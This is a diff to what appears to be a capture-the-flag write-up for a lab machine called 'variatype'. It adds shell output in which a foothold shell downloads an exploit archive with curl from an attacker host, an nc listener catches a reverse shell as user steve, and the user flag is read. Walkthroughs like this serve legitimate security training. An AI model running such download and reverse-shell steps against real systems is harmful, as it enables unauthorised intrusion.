@@ -454,7 +454,32 @@ www-data@variatype:~/portal.variatype.htb/public/files$ curl -O http://10.10.15.
 www-data@variatype:~/portal.variatype.htb/public/files$ ls -la exploit.zip
 ls -la exploit.zip
 -rw-r--r-- 1 www-data www-data 616 Mar 15 05:54 exploit.zip
+www-data@variatype:~/portal.variatype.htb/public/files$ date
+date
+Sun Mar 15 05:56:40 EDT 2026
+www-data@variatype:~/portal.variatype.htb/public/files$ ls -la /var/www/portal.variatype.htb/public/files/
+< ls -la /var/www/portal.variatype.htb/public/files/
+total 24
+drwxrwsr-x 2 www-data  www-data 4096 Mar 15 05:54 .
+drwxrwxr-x 4 root      www-data 4096 Mar  9 08:29 ..
+-rw-r--r-- 1 www-data  www-data  616 Mar 15 05:54 exploit.zip
+-rw-r--r-- 1 variatype www-data  908 Mar 15 05:21 glyph-check.php
+-rw-r--r-- 1 variatype www-data  592 Mar 15 05:21 variabype_FyfLLZuOXNQ.ttf
+-rw-r--r-- 1 variatype www-data  592 Mar 15 05:18 variabype_KEJ90bfgbVs.ttf
 www-data@variatype:~/portal.variatype.htb/public/files$
 ```
+
+```
+ajdev@rootbox:~$ nc -lvnp 60001
+Listening on 0.0.0.0 60001
+Connection received on 10.129.8.177 37148
+bash: cannot set terminal process group (46596): Inappropriate ioctl for device
+bash: no job control in this shell
+steve@variatype:/tmp/ffarchive-46597-1$ cat /home/steve/user.txt
+cat /home/steve/user.txt
+c2336e410cf8086c08af84f8f73cea3b
+```
+
+
 
 
